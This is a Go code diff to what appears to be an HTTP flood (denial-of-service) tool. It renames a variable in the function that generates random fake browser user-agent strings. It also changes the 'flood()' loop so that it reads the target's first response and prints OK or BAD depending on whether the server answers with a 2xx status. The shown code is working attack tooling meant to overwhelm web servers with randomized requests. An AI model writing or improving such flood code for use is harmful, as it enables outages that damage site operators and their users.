@@ -19,6 +19,7 @@ import (
 	"net"
 	"net/url"
 	"os"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -87,19 +88,19 @@ func init() {
 func getuseragent() string {
 
 	platform := choice[rand.Intn(len(choice))]
-	var os string
+	var osName string
 	if platform == "Macintosh" {
-		os = choice2[rand.Intn(len(choice2)-1)]
+		osName = choice2[rand.Intn(len(choice2)-1)]
 	} else if platform == "Windows" {
-		os = choice3[rand.Intn(len(choice3)-1)]
+		osName = choice3[rand.Intn(len(choice3)-1)]
 	} else if platform == "X11" {
-		os = choice4[rand.Intn(len(choice4)-1)]
+		osName = choice4[rand.Intn(len(choice4)-1)]
 	}
 	browser := choice5[rand.Intn(len(choice5)-1)]
 	if browser == "chrome" {
 		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
 		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
-		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
+		return "Mozilla/5.0 (" + osName + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
 	} else if browser == "ie" {
 		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
 		engine := strconv.Itoa(rand.Intn(99)) + ".0"
@@ -110,7 +111,7 @@ func getuseragent() string {
 		} else {
 			token = ""
 		}
-		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
+		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + osName + "; " + token + "Trident/" + engine + ")"
 	}
 	return spider[rand.Intn(len(spider))]
 }
@@ -206,7 +207,18 @@ func flood() {
 					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 				}
 				request += header + "\r\n"
-				s.Write([]byte(request))
+				if _, err := s.Write([]byte(request)); err == nil && i == 0 {
+					tmp := make([]byte, 256)
+					if _, err := s.Read(tmp); err == nil {
+						s := string(tmp[:])
+						//fmt.Printf("Response: %s\n", s)
+						if matched, _ := regexp.MatchString("HTTP/\\d\\.\\d\\s2\\d+", s); matched == true {
+							fmt.Println("OK")
+						} else {
+							fmt.Println("BAD")
+						}
+					}
+				}
 			}
 			s.Close()
 		}
